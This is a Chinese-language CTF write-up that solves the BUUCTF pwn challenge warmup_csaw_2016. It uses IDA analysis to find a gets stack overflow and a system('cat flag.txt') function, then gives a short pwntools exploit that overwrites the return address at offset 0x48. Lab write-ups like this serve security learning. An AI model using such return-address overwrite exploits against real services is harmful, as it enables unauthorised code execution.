## 0x01前言

题目来自BUUCTF pwn。相关知识点总结是针对于题目写的，所以会比较简洁，如果想详细了解，知识点来源会在参考文献里给出链接^^。

## 0x02 审题

![image.png](https://image.3001.net/images/20220529/1653795484_6292ea9c8d2a411ce7016.png!small)

  * warmup热身，估计是一道比较简单的题目

  * 给了一个文件，照例体检就是了

## 0x03 静态分析

### 3.1 checksec体检

![image.png](https://image.3001.net/images/20220529/1653795694_6292eb6e9b724d3b254b3.png!small)  
现在就不再像以前那样全部分析了，直接列出关键点：  

    
    
    stack： no canary found    //栈溢出保护未开启
    PIE： No PIE    //地址随机化也没开
    

### 3.2 IDA pro分析

####  **3.2.1 寻找线索**

汇编代码有些乱，直接反汇编后看main函数的伪代码：  
![image.png](https://image.3001.net/images/20220529/1653796097_6292ed01a2b8be2916127.png!small)  
又是gets函数，大概率就是一个栈溢出了，那么手段明确了，现在去strings窗口找找目标在哪：  
![image.png](https://image.3001.net/images/20220529/1653796203_6292ed6b4a38f5ff1cebe.png!small)  
看到有system和cat flag.txt，估计就是这两了，然后这里比较有意思的地方在于，无法用交叉引用的功能直接找到哪个函数调用了它们。

####  **3.2.2 寻找目标函数**

![image.png](https://image.3001.net/images/20220529/1653797845_6292f3d57a54d5d83b3cd.png!small)  
![image.png](https://image.3001.net/images/20220529/1653797854_6292f3de8c5f712ee09c5.png!small)  
这里我直接根据结果来说吧：无法一步使用交叉引用寻找到调用command的原因在于，在我们的目标函数里是使用直接指向静态地址的方式调用了“cat
flag.txt”这句话，所以没法通过command名称需要被引用的地方，如下目标函数，它是通过直接指向0x400734h来调用command的：  
![image.png](https://image.3001.net/images/20220529/1653798038_6292f4963a951b07b300d.png!small)  
而如何通过system函数寻找也是一环套一环，没法直接跳到，但总归是可以的：  
双击system跳转到其ELF string table，而这里的system是可以使用交叉引用的：  
![image.png](https://image.3001.net/images/20220529/1653798304_6292f5a0d58d45b666fbc.png!small)  
有两个地方调用了system，我们先看第一个，双击address跳转到IDA view的汇编代码：  
![image.png](https://image.3001.net/images/20220529/1653798412_6292f60ccad6d12f4b056.png!small)  
这里其实很接近了，因为这里其实就是system函数的代码，而且右侧的注释也给出了交叉引用，双击跳转即可：  
![image.png](https://image.3001.net/images/20220529/1653798564_6292f6a4e3cb1d1fdd182.png!small)那么就已经成功找到了目标函数的入口地址0x40060D。  

####  **3.2.3 寻找溢出点**

因为在前面的分析中，已经找到了使用的手段——栈溢出和目标函数的入口——0x40060D，那么现在只要找到栈溢出的位置就可以了，双击变量v5，就可以看到stack
of main（其实这里不用看也可以，毕竟注释中就写了它的起点距离rbp有40h，那么在不开启canary的情况下，只要在+8h就能劫持返回地址了）。  
![image.png](https://image.3001.net/images/20220529/1653798946_6292f8223c2e5f11ac1aa.png!small)  
![image.png](https://image.3001.net/images/20220529/1653798987_6292f84b593ba58e8c2aa.png!small)  
这里确实也像推测的那样，距离返回地址：40h+8h=48h，那么静态分析就到此结束了。

## 0x04 exp编写

因为这里使用的方法仍为栈溢出，在上一篇的rip已经展示过其内存分布，而且这题与rip雷同，所以这里就不再进行动态调试了，直接进行exp编写。

    
    
    from pwn import *
    
    #p = process('./warmup_csaw_2016')
    
    p = remote('node4.buuoj.cn', 28099)
    #context.terminal = ['tmux','splitw', '-h']
    #context(arch = 'amd64' , os = 'linux', log_level="debug")
    
    //与rip唯一不同的地方就在于这里变为了0x48
    payload = b'a'*0x48 + p64(0x40060d)
    #gdb.attach(p, gdbscript="b *(0x40069e)")
    p.sendline(payload)
    
    p.interactive()
    

可以看到运行时，程序已经帮我们打印了目标函数的入口地址，所以好好阅读汇编代码和动态调试还是必要的^^。  
![image.png](https://image.3001.net/images/20220529/1653799418_6292f9fa201b54e914273.png!small)

## 0x05 知识点总结

### IDA pro的使用

  1. 无法对字符串变量进行交叉引用的原因：在函数中直接使用了这个字符串地址，并没有使用变量名称进行调用，所以无法通过变量名称找到引用点。

  2. 对于系统函数的交叉引用链可能较长，这类函数出自got表，需要耐心一步步找。对于系统函数的调用流程不是很熟悉，找时间学学编译原理。

## 0x06 参考文献

[[BUUCTF]PWN3——warmup_csaw_2016](https://blog.csdn.net/mcmuyanga/article/details/108201904)

